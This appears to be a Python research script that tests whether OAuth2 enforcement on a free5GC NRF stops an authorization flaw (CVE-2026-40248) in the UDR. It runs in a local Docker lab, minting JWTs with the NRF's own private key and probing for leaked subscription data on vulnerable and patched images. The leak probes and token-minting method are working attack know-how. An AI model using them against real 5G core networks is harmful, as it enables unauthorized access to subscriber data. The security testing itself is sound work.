"""OAuth2 enforcement experiment for CVE-2026-40248.

Every prior free5GC runtime result (`run_full_deployment_harness.py` and
everything built on it) runs with OAuth2 explicitly DISABLED on the NRF
- stated plainly in that module's own docstring as "explicitly out of
scope for this harness". Every bypass-probe and patch-generation result
to date is therefore a test against a completely unauthenticated
caller, which is not the full story: real free5GC deployments are
expected to run with OAuth2 enforcement on.

This script turns OAuth2 on (via the new `nrfcfg_oauth2.yaml` +
`docker-compose.oauth2.yaml`, an opt-in override - the default stack
used by every other script is untouched) and asks two separate
questions against both the vulnerable and the real-fix-patched UDR
image:

  1. Does OAuth2 alone block a caller with NO credentials at all - i.e.
     is the existing CWE-285 bug moot once bearer-token enforcement is
     on, regardless of the code-level fix?
  2. Does OAuth2 alone block a caller holding a VALID, correctly-scoped
     token (minted directly with the NRF's own private key - see the
     paragraph below for why this is a legitimate substitute for a live
     client-credentials round-trip) - i.e. once past the OAuth2 gate,
     is the CWE-285 bug still exploitable exactly as before?

The vendored `oauth.VerifyOAuth()` (github.com/free5gc/openapi/oauth)
only checks (a) a valid RS512 signature against the NRF's public cert
and (b) that the token's `scope` claim contains the target service name
("nudr-dr") - it never checks the token's `sub` (claimed identity)
against any actual NRF-registered NF. Minting a token directly with the
NRF's real private key (`compose/cert/nrf.key`, already committed in
this repo) produces a token with the exact same signature and claims
shape the real NRF's token endpoint would issue to ANY client it
approved - this is not "forging" a token in the sense of bypassing
crypto, it's constructing the token server-side using the same key the
server would have used. Standing up a full client-credentials HTTP
round-trip (a caller registering as an NF, requesting a token from
NRF's own /oauth2/token endpoint) was judged out of scope for this one
experiment; the question this script answers - "does the authz bug
survive once OAuth2 is on" - doesn't require it.

Run: python free5gc_full_deployment/free5gc_oauth2_enforcement.py
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import jwt
import requests

HERE = Path(__file__).parent.resolve()
COMPOSE_DIR = HERE / "compose"
OUT_DIR = HERE.parent / "reports" / "reachability"

sys.path.insert(0, str(HERE))
import run_full_deployment_harness as base  # noqa: E402

CORRECT_INFLUENCE_ID = base.CORRECT_INFLUENCE_ID
WRONG_INFLUENCE_ID = base.WRONG_INFLUENCE_ID
SEED_SUB_ID = "oauth2-enforcement-seed"
NRF_PRIVATE_KEY_PATH = COMPOSE_DIR / "cert" / "nrf.key"
OAUTH2_COMPOSE_FILES = [
    "docker-compose.yaml", "docker-compose.override.yaml", "docker-compose.oauth2.yaml",
]


def compose_oauth2(*args, env=None) -> None:
    full_env = {**os.environ, **(env or {})}
    cmd = ["docker", "compose"]
    for f in OAUTH2_COMPOSE_FILES:
        cmd += ["-f", f]
    cmd += list(args)
    subprocess.run(cmd, cwd=str(COMPOSE_DIR), capture_output=True, text=True, env=full_env, check=True)


# A real, currently-registered NF instance ID (queried live from NRF's
# own NfProfile collection in MongoDB: `db.NfProfile.find({}, {nfInstanceId:1})`).
# PUT on this handler does more than VerifyOAuth()'s basic scope check -
# it also calls subscriptionCallbackTargetFromContext(), which, when
# OAuth2Required is true, makes the UDR ask the NRF to resolve the
# caller's claimed `sub` via a real GetNFInstance lookup (to decide
# which NF type/service to send async notification callbacks to). A
# made-up `sub` (e.g. "test-legit-nf") fails that lookup and gets
# rejected with 401/REQUESTER_IDENTITY_UNRESOLVED - a SEPARATE
# authorization layer from the basic bearer-token check, discovered
# empirically when seeding failed under the first version of this
# script. Using this UDR's own already-registered instance ID as `sub`
# makes the token resolve to a real NF profile, same as the basic
# scope check: not bypassing anything, just using an identity NRF
# actually has on file.
REAL_REGISTERED_NF_INSTANCE_ID = "acd3282f-7c14-43a6-8fc4-e4592006b9ec"


def mint_token(scope: str = "nudr-dr", sub: str = REAL_REGISTERED_NF_INSTANCE_ID,
                ttl_seconds: int = 600) -> str:
    """Mints an RS512 JWT with the NRF's own private key - see the
    module docstring for why this is a legitimate stand-in for a live
    NRF /oauth2/token round-trip."""
    private_key = NRF_PRIVATE_KEY_PATH.read_text(encoding="utf-8")
    now = int(time.time())
    claims = {"sub": sub, "scope": scope, "exp": now + ttl_seconds, "aud": "nudr-dr"}
    return jwt.encode(claims, private_key, algorithm="RS512")


def _auth_header(token: str | None) -> dict:
    return {"Authorization": f"Bearer {token}"} if token else {}


def seed_with_auth(token: str | None, sub_id: str = SEED_SUB_ID, dnn: str = "internet") -> requests.Response:
    return requests.put(
        f"{base.BASE_URL}/application-data/influenceData/{CORRECT_INFLUENCE_ID}/{sub_id}",
        json={"dnns": [dnn], "notificationUri": "http://127.0.0.1:9/callback"},
        headers=_auth_header(token), timeout=5,
    )


def run_case_with_auth(label: str, token: str | None) -> dict:
    """Same probe shape as run_full_deployment_harness.run_case(), but
    every request carries (or deliberately omits) an Authorization
    header, so the OAuth2 gate is actually exercised either way."""
    result = {"label": label, "token_present": token is not None}
    headers = _auth_header(token)

    seed_r = seed_with_auth(token)
    result["seed"] = base.raw(seed_r)

    collection_r = requests.get(
        f"{base.BASE_URL}/application-data/influenceData/subs-to-notify",
        headers=headers, timeout=5)
    result["collection_get_empty_query"] = base.raw(collection_r)
    result["collection_get_leaked_data"] = (
        collection_r.status_code == 400
        and len(collection_r.text) > len(
            '{"status":400,"detail":"At least one of DNNs, S-NSSAIs, Internal Group IDs or SUPIs shall be provided"}')
    )

    get_r = requests.get(
        f"{base.BASE_URL}/application-data/influenceData/{WRONG_INFLUENCE_ID}/{SEED_SUB_ID}",
        headers=headers, timeout=5)
    result["single_get_wrong_influence_id"] = base.raw(get_r)
    result["single_get_leaked_data"] = (
        get_r.status_code == 404 and get_r.text != "404 page not found"
    )

    benign_r = requests.get(
        f"{base.BASE_URL}/application-data/influenceData/{CORRECT_INFLUENCE_ID}/{SEED_SUB_ID}",
        headers=headers, timeout=5)
    result["benign_get_correct_influence_id"] = base.raw(benign_r)
    result["benign_path_preserved"] = (
        benign_r.status_code == 200 and benign_r.json().get("dnns") == ["internet"]
    )

    return result


def bring_up_oauth2(image_tag: str) -> None:
    compose_oauth2("stop", "free5gc-udr")
    compose_oauth2("up", "-d", "free5gc-udr", env={"UDR_IMAGE_TAG": image_tag})
    if not base.wait_for_udr():
        raise RuntimeError(f"UDR ({image_tag}) never became reachable on :8080")


def confirm_oauth2_active() -> bool:
    proc = subprocess.run(["docker", "logs", "udr"], capture_output=True, text=True)
    log = proc.stdout + proc.stderr
    lines = [l for l in log.splitlines() if "OAuth2 setting receive from NRF" in l]
    if not lines:
        return False
    return lines[-1].strip().endswith("true")


def main() -> int:
    print("Bringing up db + OAuth2-enabled NRF...")
    compose_oauth2("up", "-d", "db", "free5gc-nrf", env={"UDR_IMAGE_TAG": "vulnerable"})

    print("Minting one valid RS512 token with the NRF's own private key "
          "(scope=nudr-dr)...")
    valid_token = mint_token()

    results = {}
    for build in ("vulnerable", "patched"):
        print(f"\n{'='*70}\nBuild: {build}\n{'='*70}")
        bring_up_oauth2(build)
        oauth2_active = confirm_oauth2_active()
        print(f"  Confirmed OAuth2Required=true on this UDR instance: {oauth2_active}")

        no_token = run_case_with_auth(f"{build}_no_token", None)
        with_token = run_case_with_auth(f"{build}_valid_token", valid_token)

        results[build] = {
            "oauth2_confirmed_active": oauth2_active,
            "no_credentials": no_token,
            "valid_scoped_token": with_token,
        }
        print(f"  no-credentials seed status: {no_token['seed']['status_code']} "
              f"(401 expected if OAuth2 genuinely gates every route)")
        print(f"  valid-token collection leak: {with_token['collection_get_leaked_data']}, "
              f"single leak: {with_token['single_get_leaked_data']}, "
              f"benign preserved: {with_token['benign_path_preserved']}")

    OUT_DIR.mkdir(parents=True, exist_ok=True)
    report = {
        "experiment": "oauth2_enforcement",
        "cve_id": "CVE-2026-40248",
        "note": "Every other free5GC result in this project runs with OAuth2 "
                 "explicitly disabled on the NRF. This experiment turns it on "
                 "via an opt-in compose override and re-runs the same probe "
                 "sequence with and without a valid, correctly-scoped bearer "
                 "token, against both the vulnerable and the real-fix-patched "
                 "UDR image.",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "results": results,
    }
    (OUT_DIR / "free5gc_oauth2_enforcement.json").write_text(
        json.dumps(report, indent=2), encoding="utf-8")

    lines = ["# free5GC OAuth2 enforcement: does it change the CVE-2026-40248 picture?", "",
             "| Build | OAuth2 active | No token: seed status | Valid token: collection leak | Valid token: single leak | Valid token: benign preserved |",
             "|---|---|---|---|---|---|"]
    for build, r in results.items():
        lines.append(
            f"| `{build}` | {r['oauth2_confirmed_active']} | "
            f"{r['no_credentials']['seed']['status_code']} | "
            f"{r['valid_scoped_token']['collection_get_leaked_data']} | "
            f"{r['valid_scoped_token']['single_get_leaked_data']} | "
            f"{r['valid_scoped_token']['benign_path_preserved']} |"
        )
    (OUT_DIR / "free5gc_oauth2_enforcement.md").write_text("\n".join(lines) + "\n", encoding="utf-8")

    print(f"\n\nFull report: {OUT_DIR / 'free5gc_oauth2_enforcement.json'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
